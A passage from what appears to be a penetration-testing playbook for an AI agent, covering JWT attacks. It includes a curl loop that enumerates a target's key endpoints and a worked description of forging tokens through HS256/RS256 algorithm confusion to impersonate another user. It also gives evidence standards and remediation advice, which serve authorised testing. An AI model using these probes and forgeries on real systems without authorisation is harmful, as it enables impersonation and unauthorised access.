baseline and proves nothing.

### 14.8 Key-source enumeration before assuming confusion

```bash
for P in /.well-known/jwks.json /oauth/certs /jwks /jwks.json /certs /pubkey          /api/v1/keys /api/keys /admin/jwks /oauth2/v1/certs /openid/v1/jwks; do
  for H in "$HOST" "$HOST:8443"; do
    C=$(curl -sk -o /tmp/k -w '%{http_code}' "https://$H$P")
    [ "$C" = 200 ] && echo "FOUND $H$P ($(wc -c </tmp/k)B)" && head -c 120 /tmp/k && echo
  done
done
```

A discovered public key is only useful if it is the key that actually verifies your token - confirm
with the RS256 control in 14.3 before building the HMAC variants.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [attack-jwt](../attack-jwt/SKILL.md) - the compact attack-side companion to this playbook
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - OAuth-specific token abuse beyond the JWT layer
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - where the token is issued; audience and issuer failures originate here
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the same audience/binding failures in the SAML world
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the authorization layer a forged token is used to reach

---

---

## 15. EVIDENCE STANDARD — TOKEN ARTEFACTS

| Item | Why |
|---|---|
| The **decoded header, payload, and signature**, verbatim | you cannot test what you have not read |
| The **original token**, exact, as the untampered control | every claim is relative to an accepted baseline |
| The **tampered token** and the **endpoint that accepted it** | the acceptance is the finding |
| The **response difference** between original and tampered | proves the tamper changed something, not that it was ignored |
| The **key source** for a `kid`/jku/x5u finding: the URL and the fetched document | the SSRF or key-injection proof |
| The **secret**, if cracked, with the **wordlist name and its size** | a crack proves the secret was in that wordlist |
| The **claim** abused, and the **consequence** observed | claims are only findings where a decision changes |
| Whether the `aud`, `iss`, `exp`, and `nbf` were **validated at all** | the four most common missing checks, each a separate finding |
| The **algorithm** the server actually accepted, versus the one it issued | the confusion finding |
| The **endpoint that refused** the token | the control; a token accepted everywhere may be a decoy |

Report the **acceptance and the control**: "the token issued for `user=alice` was decoded to
`{"alg":"RS256","kid":"k1"}` and `{"sub":"alice","aud":"api","exp":…}`, and replaying it unmodified
returned `200` with `alice`'s data, which is the baseline. Re-issuing the same claims with `alg` set to
`HS256` and signed with the **public key bytes** as the HMAC secret returned `200` with `alice`'s data
from `/api/me`, while the same forged token against `/api/admin` returned `403`, and the token with
`alg: none` and an empty signature returned `401` from both, so the parser rejects `none` but accepts the
confused algorithm. A second forged token with `sub` set to `bob` and otherwise identical claims returned
`200` with **bob's** data, which proves the confusion yields impersonation rather than only a signature
bypass", never "the JWT implementation is vulnerable to algorithm confusion".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A token you **did not decode** before testing | an untested assumption about the format |
| An **`alg: none` token the server rejected** | the parser is correct; report the rejection |
| A tampered token that returned a **different error than the original** | the signature was checked and the difference is the rejection |
| A **forged** token accepted only on an endpoint that **returns public data** | no privilege change; test an endpoint with a decision |
| A **cracked HMAC secret** with no demonstration of a forged token being accepted | the crack alone is a finding about the secret's strength, not about the app |
| A claim you changed where the app **ignored that claim entirely** | no consequence; name the claim that matters |
| A signature you **did not verify was actually stripped** | base64 re-encoding can silently change the token |
| An acceptance you saw in a **staging or debug** environment | verify the environment before reporting |
| A **`kid` pointing to a URL you control** with no fetched document recorded | the SSRF claim is unproven without the request log |
| A token accepted by **your own decoder** but not by the server | the server is the only oracle that counts |

**A tampered token accepted by the server, with the original as baseline and a refusing endpoint as
control.** A decode, a local verification, and a claimed algorithm confusion are this family's three
standard non-findings.

---

## 16. REMEDIATION REFERENCE — TOKEN VALIDATION HARDENING

1. **Pin the accepted algorithms to an explicit allow-list per key and per endpoint, and never derive the algorithm from the token header** - the header is attacker-controlled and the confusion family exists only because it is trusted.
2. **Resolve `kid` against a local key store and never fetch it from a URL, a JWKS endpoint, or an `x5u`/`jku` the token supplies** - a token-supplied key location is a signature bypass and an SSRF in one.
3. **Validate `iss`, `aud`, `exp`, and `nbf` on every request, with `aud` matched to the specific service** - failing to check `aud` is what turns one product's token into every product's token.
4. **Reject `alg: none` at the parser level rather than by string comparison, and treat a missing algorithm as an error** - string matching misses the encoding and casing variants.
5. **Verify the signature on the raw received bytes, before any re-encoding, unescaping, or JSON round-trip** - a signature computed after a transformation is checking the wrong bytes.
6. **Treat claims as untrusted input: `sub`, `role`, `scope`, `tenant`, and any entitlement must be checked against server-side state, not read as authority** - a valid signature says the issuer signed the claim, not that the claim is authorised here.
7. **Use a secret with enough entropy to be outside any wordlist, and prefer asymmetric signing where the verifier does not need the signing key** - an offline-crackable HMAC secret is a full impersonation primitive.
8. **Bind tokens to the client that requested them: the client id, the audience, and where possible `cnf`, `azp`, or a proof-of-possession key** - it stops the cross-product and cross-client reuse families.
9. **Key rotation needs overlapping validity windows and a key id that the verifier can resolve locally; a rotation that invalidates live tokens is an availability incident** - publish the rotation policy with the design.
10. **Rate-limit and log token verification failures per token, per subject, and per endpoint, and alert on a high ratio of failures on one token id** - the forgery attempts are visible in the failure ratio.
11. **Reject tokens presented in query strings, and keep them out of logs and referrers** - the leak path is often the logging layer, not the token itself.

---

## 17. RELATED SIBLINGS - TOKEN CROSS-REFERENCE

- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - the sibling token family
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - the flow that issues these tokens
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the assertion-based counterpart
- [attack-jwt](../attack-jwt/SKILL.md) - the runnable atomic-test toolkit
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the authorization layer above the token
